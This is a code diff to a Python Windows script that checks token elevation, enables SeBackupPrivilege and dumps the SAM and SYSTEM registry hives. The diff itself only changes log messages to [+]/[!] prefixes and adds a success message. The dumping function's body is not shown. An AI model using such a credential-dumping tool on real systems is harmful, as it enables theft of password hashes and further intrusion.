@@ -14,10 +14,10 @@ def ElevatedorNot():
     elevated = win32security.GetTokenInformation(thehandle, win32security.TokenElevation)
     #print("is token elevated?", elevated)
     if elevated == 1:
-        print("elevated status: TokenIsElevated!!!")
+        print("[+] elevated status: TokenIsElevated!!!")
         return True
     else:
-        print("token is not elevated...")
+        print("[!] token is not elevated...")
         return False
 
 def SetBackupPrivilege():
@@ -26,10 +26,10 @@ def SetBackupPrivilege():
         id = win32security.LookupPrivilegeValue(None, "SeBackupPrivilege")
         newPrivileges = [(id, win32security.SE_PRIVILEGE_ENABLED)]
         win32security.AdjustTokenPrivileges(thehandle, False, newPrivileges)
-        print("successfully gained SeBackupPrivilege!!!!")
+        print("[+] successfully gained SeBackupPrivilege!!!!")
         return True
     except:
-        print("couldn't get seDebugPrivilege...")
+        print("[!] couldn't get seDebugPrivilege...")
         return False
 
 def dumpreg():
@@ -52,9 +52,12 @@ if not ElevatedorNot():
     f.write("not elevated...\n")
     exit()
 if not SetBackupPrivilege():
-    f.write("could not get seBackupPrivilege...\n")
+    f.write("[!] could not get seBackupPrivilege...\n")
     exit()
 if not dumpreg():
-    f.write("couldn't dump registry...\n")
+    f.write("[!] couldn't dump registry...\n")
+    exit()
+else:
+    f.write("[+] Successfully dumped SAM and SYSTEM!!!\n")
     exit()
 f.close()
